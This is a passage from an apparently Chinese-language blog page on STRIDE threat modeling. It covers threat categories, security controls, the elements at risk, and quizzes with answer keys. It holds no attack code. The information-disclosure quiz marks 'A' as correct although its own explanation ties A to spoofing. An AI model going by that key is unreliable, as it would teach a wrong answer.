框架中的六个主要威胁类别来发现安全设计问题：</p><table><thead><tr><th align="left">Category</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">欺骗</td><td align="left">冒充某人或某物</td></tr><tr><td align="left">篡改</td><td align="left">未经授权更改数据</td></tr><tr><td align="left">否认性</td><td align="left">不宣称对执行的操作负责</td></tr><tr><td align="left">信息泄露</td><td align="left">未经许可查看数据</td></tr><tr><td align="left">拒绝服务</td><td align="left">系统繁忙</td></tr><tr><td align="left">权限提升</td><td align="left">拥有本不应该拥有的权限</td></tr></tbody></table><h4 id="安全控制类别"><a href="#安全控制类别" class="headerlink" title="安全控制类别"></a>安全控制类别</h4><p>每个威胁类别都与安全控制关联，以帮助你降低或消除风险</p><table><thead><tr><th align="left">类别</th><th align="left">安全控制</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">欺骗</td><td align="left">身份验证</td><td align="left">其身份是否如其所述</td></tr><tr><td align="left">篡改</td><td align="left">完整性</td><td align="left">防止恶意修改数据</td></tr><tr><td align="left">否认性</td><td align="left">不可否认性</td><td align="left">操作与用户绑定</td></tr><tr><td align="left">信息泄露</td><td align="left">机密性</td><td align="left">保护数据免遭意外泄露</td></tr><tr><td align="left">拒绝服务</td><td align="left">可用性</td><td align="left">系统适当处理所有请求</td></tr><tr><td align="left">特权提升</td><td align="left">授权</td><td align="left">用户拥有执行请求的适当权限</td></tr></tbody></table><p>我们在接下来的几个单元中来了解一下各种威胁类别。</p><h3 id="欺骗-冒充某人或某物"><a href="#欺骗-冒充某人或某物" class="headerlink" title="欺骗 - 冒充某人或某物"></a>欺骗 - 冒充某人或某物</h3><p>当恶意人员或程序成功地冒充用户或系统进行恶意活动时，就会发生欺骗。</p><p>示例包括：</p><ul><li>攻击者通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限</li><li>攻击者欺骗 SSID 和 IP 地址，同时使用开放且原本不安全的 TCP/IP 协议向受害者发送恶意的有效负载</li></ul><h4 id="可能面临欺骗攻击风险的元素和交互"><a href="#可能面临欺骗攻击风险的元素和交互" class="headerlink" title="可能面临欺骗攻击风险的元素和交互"></a>可能面临欺骗攻击风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">外部实体</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">控制措施之外的过程、数据存储，甚至完全成熟的应用程序</td></tr></tbody></table><p>交互</p><table><thead><tr><th align="left">名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务从任务接收数据或向任务发送数据</td></tr><tr><td align="left">过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr><tr><td align="left">过程 &lt;-&gt; 外部实体</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">一个任务向外部实体发送数据或从外部实体接收数据</td></tr></tbody></table><h4 id="如何防止欺骗攻击"><a href="#如何防止欺骗攻击" class="headerlink" title="如何防止欺骗攻击"></a>如何防止欺骗攻击</h4><p>身份验证验证了用户和系统的身份是否属实。</p><p>示例包括：</p><ul><li>发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性</li><li>使用 SSL/TLS 保护数据传输，以加密信息源和目标之间的流量</li><li>使用具有时效有限的令牌、密码或多重身份验证的唯一凭据来帮助保护用户、管理员和服务帐户</li></ul><h4 id="用于降低或消除风险的常用安全控制"><a href="#用于降低或消除风险的常用安全控制" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><p>对于数据：</p><ul><li>哈希</li><li>消息验证码</li><li>数字签名</li></ul><p>对于系统：</p><ul><li>用户身份验证</li><li>Cookie 身份验证</li><li>Kerberos</li><li>SSL/TLS</li><li>证书</li><li>IPSec</li><li>数字签名的数据包</li></ul><div class="note green"><p>推荐问题：是否已验证通信双方的身份？</p></div><h4 id="知识检查-13"><a href="#知识检查-13" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对欺骗的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统为访问控制列表中列出的用户授予管理访问权限。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 此消息适用于欺骗。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。</psw></p><h3 id="篡改-未经授权更改数据"><a href="#篡改-未经授权更改数据" class="headerlink" title="篡改 - 未经授权更改数据"></a>篡改 - 未经授权更改数据</h3><p>当恶意攻击者未经授权在系统中读取、修改、删除或插入数据时，就会发生篡改。</p><p>示例包括：</p><ul><li>修改临时存储在缓存中、通过网络发送或永久存储在数据库中的数据以破坏数据完整性</li><li>将恶意有效负载插入浏览器缓存中，以导致进程和数据存储中的行为异常</li><li>通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息</li><li>将数据重定向到被入侵的计算机以接管系统</li><li>诱使用户连接网络或下载文件，从而授予他们流量和设备访问权限（与欺骗结合使用）</li></ul><h4 id="可能面临篡改攻击风险的元素和交互"><a href="#可能面临篡改攻击风险的元素和交互" class="headerlink" title="可能面临篡改攻击风险的元素和交互"></a>可能面临篡改攻击风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久或临时的数据存储</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">元素之间的数据移动</td></tr></tbody></table><p>交互</p><table><thead><tr><th>名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td>过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr><tr><td>数据流 &lt;-&gt; 信任边界</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">通过 Internet 将数据从受信任的环境传输给某人（反之亦然）</td></tr></tbody></table><h4 id="如何防止篡改"><a href="#如何防止篡改" class="headerlink" title="如何防止篡改"></a>如何防止篡改</h4><p>完整性防止恶意修改数据。 示例包括：</p><ul><li>验证输入以防止处理恶意有效负载和错误处理意外行为</li><li>使用数字签名对消息进行签名，以确保消息不被篡改</li><li>使用访问控制列表应用权限</li><li>使用 SSL/TLS 保护传输</li><li>创建 IPSec 隧道，以保护终结点之间的通信</li></ul><h4 id="用于降低或消除风险的常用安全控制-1"><a href="#用于降低或消除风险的常用安全控制-1" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>操作系统完整性控制</li><li>访问控制列表 (ACL)</li><li>数字签名</li><li>消息验证码</li></ul><div class="note green"><p>推荐问题：如何得知某人无法更改传输中的数据或静态数据？</p></div><h4 id="知识检查-14"><a href="#知识检查-14" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对篡改的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发件人对电子邮件附件进行加密，以便让收件人知道电子邮件由何人所发。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统为访问控制列表中列出的用户授予管理访问权限。</p>            </div><p>参考答案：<psw>== C ==</psw></p><p>解释：<psw>A. 加密附件是不够的。 对消息进行数字签名，以确保不会发生篡改。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。</psw></p><h3 id="否认性-不宣称对执行的操作负责"><a href="#否认性-不宣称对执行的操作负责" class="headerlink" title="否认性 - 不宣称对执行的操作负责"></a>否认性 - 不宣称对执行的操作负责</h3><p>当有人出于恶意或无意采取某个操作，但声明其他操作时，就会发生否认性。</p><p>示例包括：</p><ul><li>拒绝修改包含敏感操作的日志</li><li>使用其他人的帐户以避免被抓</li><li>声称没有删除数据库记录</li></ul><div class="note info"><p>系统日志是攻击者的金矿，不仅可用于操纵，而且可用于收集有关用户、环境和弱点的数据。</p></div><h4 id="可能面临否认性攻击风险的元素和交互"><a href="#可能面临否认性攻击风险的元素和交互" class="headerlink" title="可能面临否认性攻击风险的元素和交互"></a>可能面临否认性攻击风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">外部实体</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">控制措施之外的过程、数据存储，甚至完全成熟的应用程序</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久或临时的数据存储</td></tr></tbody></table><p>交互</p><table><thead><tr><th>名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td>过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务从任务接收数据或向任务发送数据</td></tr><tr><td>过程 &lt;-&gt; 外部实体</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">一个任务向用户发送数据或从用户接收数据</td></tr><tr><td>过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr></tbody></table><h4 id="如何防止否认性攻击"><a href="#如何防止否认性攻击" class="headerlink" title="如何防止否认性攻击"></a>如何防止否认性攻击</h4><p>不可否认性通过创建和保护安全日志来确保每个操作都可以追溯到其来源。</p><h4 id="用于降低或消除风险的常用安全控制-2"><a href="#用于降低或消除风险的常用安全控制-2" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>强身份验证</li><li>安全日志记录和监视</li><li>数字签名</li><li>安全时间戳</li><li>受信任的第三方</li></ul><div class="note green"><p>推荐问题：是否可以将每个操作与身份绑定？</p></div><h4 id="知识检查-15"><a href="#知识检查-15" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对否认性的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统为访问控制列表中列出的用户授予管理访问权限。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 此消息适用于欺骗。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。</psw></p><h3 id="信息泄漏-查看不应查看的数据"><a href="#信息泄漏-查看不应查看的数据" class="headerlink" title="信息泄漏 - 查看不应查看的数据"></a>信息泄漏 - 查看不应查看的数据</h3><p>向未经授权的个人公开敏感数据时，会发生信息泄漏。 无论是在有意或无意的情况下，都有可能发生信息泄露。</p><p>示例包括：</p><ul><li>系统通过错误消息泄露敏感数据</li><li>用户访问安全控制较弱的未授权文档和文件夹</li><li>用户访问流经非安全网络的数据</li></ul><h4 id="可能面临信息泄漏风险的元素和交互"><a href="#可能面临信息泄漏风险的元素和交互" class="headerlink" title="可能面临信息泄漏风险的元素和交互"></a>可能面临信息泄漏风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久或临时的数据存储</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">元素之间的数据移动</td></tr></tbody></table><p>交互</p><table><thead><tr><th align="left">名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务将数据发送到另一个任务</td></tr><tr><td align="left">过程 &lt;-&gt; 外部实体</td><td align="left"><img src="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" class="lazyload" data-srcset="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">一个任务向用户发送数据或从用户接收数据</td></tr><tr><td align="left">过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr><tr><td align="left">数据流 &lt;-&gt; 信任边界</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">通过 Internet 将数据从受信任的环境传输给某人（反之亦然）</td></tr></tbody></table><h4 id="如何防止信息泄漏"><a href="#如何防止信息泄漏" class="headerlink" title="如何防止信息泄漏"></a>如何防止信息泄漏</h4><p>机密性确保数据受到保护。</p><p>示例包括：</p><ul><li>应用访问控制列表，以确保合适的用户可以访问适当的数据</li><li>加密静态数据、传输中数据和正在使用的数据</li><li>强制实施 SSL/TLS 以保护传输</li><li>使用 IPSec 隧道保护跨终结点的通信</li></ul><h4 id="用于降低或消除风险的常用安全控制-3"><a href="#用于降低或消除风险的常用安全控制-3" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>加密</li><li>访问控制列表 (ACL)</li></ul><div class="note green"><p>推荐问题：是否可以确保没有人能查看我的传输中的数据和静态数据？</p></div><h4 id="知识检查-16"><a href="#知识检查-16" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对信息泄漏的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统为访问控制列表中列出的用户授予管理访问权限。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 此消息适用于欺骗。B. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。C. 这条陈述适用于否认性。</psw></p><h3 id="拒绝服务-系统繁忙"><a href="#拒绝服务-系统繁忙" class="headerlink" title="拒绝服务 - 系统繁忙"></a>拒绝服务 - 系统繁忙</h3><p>当攻击者导致系统不可用时，将发生拒绝服务。</p><p>示例包括：</p><ul><li>向网络发送大量请求</li><li>占用内存和 CPU 进程</li><li>请求数量过多导致数据存储崩溃</li></ul><h4 id="可能面临拒绝服务风险的元素和交互"><a href="#可能面临拒绝服务风险的元素和交互" class="headerlink" title="可能面临拒绝服务风险的元素和交互"></a>可能面临拒绝服务风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久或临时的数据存储</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">元素之间的数据移动</td></tr></tbody></table><p>交互</p><table><thead><tr><th align="left">名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务将数据发送到另一个任务</td></tr><tr><td align="left">过程 &lt;-&gt; 外部实体</td><td align="left"><img src="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" class="lazyload" data-srcset="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" 